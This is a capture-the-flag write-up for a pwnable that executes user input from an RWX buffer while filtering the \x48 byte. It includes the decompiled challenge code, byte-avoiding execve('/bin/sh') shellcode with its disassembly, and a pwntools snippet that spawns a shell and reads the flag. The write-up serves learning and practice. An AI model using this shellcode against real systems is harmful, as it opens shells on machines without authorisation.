# level-1

## Introduction

A pwnable passed down from my mentor, @huckfinn. This problem focuses on
creating shellcode with certain bad bytes. The objective is to get a shell
without using the hex byte `\x48`.

## Information Gathering

### Hint #1

> This program will literally do anything you want it to do (as long as you
don't use the `\x48` byte).

```shell
$ checksec ./level-0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Dynamic

This program behaves in the same manner as the previous [level][level].

### Static

We threw the program in Ghidra and this was the result after some cleanup.

```c
int main(void){
  code *__buf;
  ssize_t sVar1;
  code *pcVar2;

  init_chal();
  __buf = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  sVar1 = read(0,__buf,0x1000);
  if (sVar1 != 0) {
    pcVar2 = __buf;
    do {
      if (*pcVar2 == (code)0x48) {
        *pcVar2 = (code)0xff;
      }
      pcVar2 = pcVar2 + 1;
    } while (pcVar2 != __buf + sVar1);
  }
  (*__buf)();
  return 0;
}
```

This is the same as the previous [level][level] except for the do-while loop
that compares each byte with `\x48` and replaces it with `\xff`. Below is a
rehash of the same description as [level-0][level]:

Notably, the `main` function is `mmap`ing the region of memory where `buf` is
with the following arguments: `mmap(addr=NULL, length=0x1000, prot=0x7,
flags=0x22, fd=0xfffffff, offset=0x0)`

The prot (protections) argument describes the desired memory protection of the
mapping. It is a bitwise OR of one or more of the following flags:

```c
#define PROT_READ	  0x1		/* page can be read */
#define PROT_WRITE    0x2       /* page can be written */
#define PROT_EXEC	  0x4		/* page can be executed */
#define PROT_SEM	  0x8		/* page may be used for atomic ops */
#define PROT_NONE	  0x0		/* page can not be accessed */
```

With a prot bitmask of 0x7 the memory location is set to read, write, and
execute. The combination of the latter two are particularly interesting when we
see that it is actually executing the contents of `buf` as though there are
instructions there. There currently aren't, but could there be?

Yes! We just need to send the program some shellcode to execute.

## Strategy

We attempted to use the shellcraft module to generate the shellcode, just as in
[level-0][level]. There is an encoding functionality such that we could specify
that `\x48` is a bad byte and should be avoided. Unfortunately, we were unable
to create shellcode this way. The module simply reported that it was not
possible with its current functionality. Compiling bits of assmembly and taking
a look at the opcodes for amd64, we found that the `\x48` byte was generally
created when we tried to use the `mov` instruction into one of the base amd64
registers. We learned that we could avoid the `\x48` byte by using the `movabs`
instruction into one of the amd64 extended registers (ie, `$r11`). We thus used
the following shellcode, inspired by a [blog post][blog] we found that was
attempting to create really short shellcode.

```asm
0:   31 f6                   xor    esi,esi                 /* zero out register */
2:   56                      push   rsi                     /* push to top of stack */
3:   49 bb 2f 62 69 6e 2f    movabs r11,0x68732f2f6e69622f  /* move /bin/sh into r11 */
a:   2f 73 68
d:   41 53                   push   r11                     /* /bin/sh top of stack */
f:   54                      push   rsp                     /* memory location of /bin/sh top of stack */
10:   5f                     pop    rdi                     /* edi now contains the address of /bin/sh */
11:   b8 00 00 00 00         mov    eax,0x0                 /* mov 0 into rax */
16:   b0 3b                  mov    al,0x3b                 /* move execve sys call into rax */
18:   0f 05                  syscall                        /* call our execve */
```

We added this to our solution and created the byte string needed to send to the program:

```python
shellcode = """
/* push argument into rsi (second argument to execve) */
xor esi, esi                /* zero out register */
push rsi                    /* push to top of stack */

/* set up first argument */
mov r11, 0x68732f2f6e69622f /* move /bin/sh into r11 */
push r11                    /* /bin/sh top of stack */
push rsp                    /* memory location of /bin/sh top of stack */
pop rdi                     /* edi contains the address of /bin/sh */

/* set up third argument */
mov eax, 0x0                /* mov 0 into rax */
mov al, 0x3b                /* move execve sys call into rax */

/* call our execve */
syscall
"""

io.sendline(asm(shellcode))

# Get the flag.
io.sendline('cat flag.txt')
flag = io.recv()
```

## The Solution (with a caveat)

You should be able to run the script like so and get the flag!

```shell
$ python3 ./solve.py
[+] Flag: b'flag{AreYouTryingToTellMeICanDodgeBullets?}\n'
[+] Time: Time: 0.10761523246765137
```

## Mitigations

I won't even discuss exploitation mitigations since the develops purposefully made `buf` RWX. :)

[level]: /random-pwnables/level-0/README.md
[blog]: https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
